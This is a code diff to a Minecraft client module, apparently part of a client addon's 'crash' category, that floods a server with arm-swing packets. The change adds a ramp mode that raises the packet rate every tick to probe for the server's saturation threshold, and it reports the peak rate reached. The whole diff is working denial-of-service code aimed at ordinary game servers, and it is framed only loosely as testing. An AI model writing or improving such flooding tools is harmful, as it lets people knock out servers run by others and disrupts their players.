@@ -37,6 +37,16 @@ public class ArmAnimationFlood extends Module {
         .name("swings-per-tick").description("Arm swing packets to send each tick.")
         .defaultValue(50).range(1, 500).sliderRange(1, 200).build()
     );
+    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
+        .name("ramp-mode")
+        .description("Auto-increment rate each tick to find the server's threshold. Starts at 1, steps up by ramp-step each tick.")
+        .defaultValue(false).build()
+    );
+    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
+        .name("ramp-step").description("Rate increase per tick in ramp mode.")
+        .defaultValue(10).range(1, 500).sliderRange(1, 100)
+        .visible(rampMode::get).build()
+    );
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
         .name("auto-disable").description("Disable when kicked from the server.")
         .defaultValue(true).build()
@@ -47,18 +57,24 @@ public class ArmAnimationFlood extends Module {
     );
 
     private int ticksActive = 0, packetsSent = 0;
+    private int currentRate = 1;
 
     public ArmAnimationFlood() {
         super(AddonTemplate.CRASH_CATEGORY, "arm-animation-flood",
             "Floods swing packets. Tests broadcast queue saturation.");
     }
 
+    @Override
+    public void onActivate() { ticksActive = 0; packetsSent = 0; currentRate = 1; }
+
     @EventHandler
     private void onTick(TickEvent.Pre event) {
         if (mc.player == null) return;
         ticksActive++;
+        int rate = rampMode.get() ? currentRate : swingsPerTick.get();
+        if (rampMode.get()) currentRate += rampStep.get();
         HandSwingC2SPacket packet = new HandSwingC2SPacket(Hand.MAIN_HAND);
-        for (int i = 0; i < swingsPerTick.get(); i++) {
+        for (int i = 0; i < rate; i++) {
             mc.player.networkHandler.sendPacket(packet);
             packetsSent++;
         }
@@ -66,7 +82,10 @@ public class ArmAnimationFlood extends Module {
 
     @Override
     public void onDeactivate() {
-        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
+        if (showStats.get()) {
+            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
+            if (rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
+        }
     }
 
     @EventHandler
